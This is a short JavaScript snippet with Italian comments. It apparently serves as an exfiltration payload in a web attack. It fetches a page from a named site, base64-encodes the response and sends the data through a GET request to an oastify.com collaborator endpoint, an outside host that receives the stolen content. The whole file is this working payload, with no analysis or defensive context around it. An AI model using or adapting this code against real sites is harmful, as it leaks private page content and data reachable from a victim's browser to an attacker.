function base64Encode(str) {
    const utf8 = unescape(encodeURIComponent(str));
    const base64 = btoa(utf8);
    return base64;
}

// const url = "http://0.0.0.0:8000";

 const url = "https://radar.toolsfdg.net/";

const endpoint = "http://z33bynyrumeyj26z5bhn1sidk4qvel2a.oastify.com/?data=";

// Esecuzione della fetch
fetch(url)
    .then(response => response.text())
    .then(data => {
        // Codifica del testo in base64
        const encodedData = base64Encode(data);

        // Creazione dell'URL per inviare i dati crittografati
        const finalURL = endpoint + encodedData;

        // Esempio di invocazione del link
        fetch(finalURL);
    })
    .catch(error => {
        console.error("Si è verificato un errore:", error);
    });
